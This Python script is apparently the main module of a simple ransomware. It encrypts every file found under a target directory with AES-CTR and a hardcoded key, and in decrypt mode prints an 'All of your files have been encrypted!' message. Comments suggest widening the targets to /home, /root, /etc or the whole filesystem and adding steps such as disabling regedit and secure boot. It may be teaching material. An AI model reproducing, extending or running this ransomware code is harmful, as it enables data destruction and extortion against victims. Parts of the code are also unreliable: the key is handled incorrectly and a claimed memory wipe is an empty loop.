#!/usr/bin/python3.6
# -*- coding: utf-8 -*-
from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import os
import Discovery
import Crypter

HARDCODED_KEY = '951638064becf001cd04be8a38d02d6a62ab6a6c59a79dd351a76c91ff3a8989'  # SHA256 cryptography function (secure hash algorithm)


def get_parser():
    parser = argparse.ArgumentParser(description='Crypter')

    parser.add_argument('-d',
                        '--decrypt',
                        help='Decrypt files [default: no]',
                        action='store_true')
    return parser


def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        print('''
            All of your files have been encrypted!
            Encryption HARDCODED_KEY: '{}'
        '''.format(HARDCODED_KEY))

        key = input('Enter with valid key> ')
    else:
        if HARDCODED_KEY:
            key = HARDCODED_KEY

    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR,
                    counter=ctr)  # (advanced encryption standard)

    if not decrypt:
        cryptFn = crypt.encrypt
    else:
        cryptFn = crypt.decrypt

    init_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))
    startDirs = [
        init_path
    ]  # it might be /home, /root, /dev, /etc or even / which is root filesystem folder

    for currentDir in startDirs:
        for filename in Discovery.file_discover(currentDir):
            Crypter.change_files(filename, cryptFn)

    for _ in range(100):  # to clean up (asymmetric) public-key from memory
        pass

    if not decrypt:  # after encryption, it can change wallpaper, icons, disable regedit, admin, bios secure boot
        pass


if __name__ == '__main__':
    main()